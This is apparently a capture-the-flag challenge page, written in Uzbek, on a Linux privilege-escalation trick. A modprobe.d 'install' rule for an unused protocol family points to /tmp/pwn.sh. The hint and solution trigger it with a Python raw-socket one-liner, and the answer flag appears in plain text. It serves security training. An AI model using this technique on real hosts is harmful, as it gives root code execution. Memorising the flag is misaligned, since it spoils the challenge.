---
id: 46
title: "CH46: Modprobe.d Protocol Handler Injection"
module: "Modul 5: Automation, Systemd & Kernel"
difficulty: Hard
points: 9
tags: ['modprobe', 'kernel-hooks', 'socket', 'privesc']
flag: "HD{modprobe_protocol_handler_kernel_hook_946}"
---

# 🎯 Topshiriq #46: CH46: Modprobe.d Protocol Handler Injection

## 📌 Metama'lumotlar:
* **Modul:** `Modul 5: Automation, Systemd & Kernel`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #modprobe, #kernel-hooks, #socket, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
/etc/modprobe.d/custom.conf fayli orqali mavjud bo'lmagan tarmoq protokoli 'install net-pf-31 /tmp/pwn.sh' ga yo'naltirilgan. Socket chaqiruvi orqali modprobe ni ishga tushiring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> python3 -c 'import socket; socket.socket(31, socket.SOCK_RAW, 0)'

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
python3 -c 'import socket; socket.socket(31, socket.SOCK_RAW, 0)'
```

---

## 🚩 Maxfiy Flag:
`HD{modprobe_protocol_handler_kernel_hook_946}`
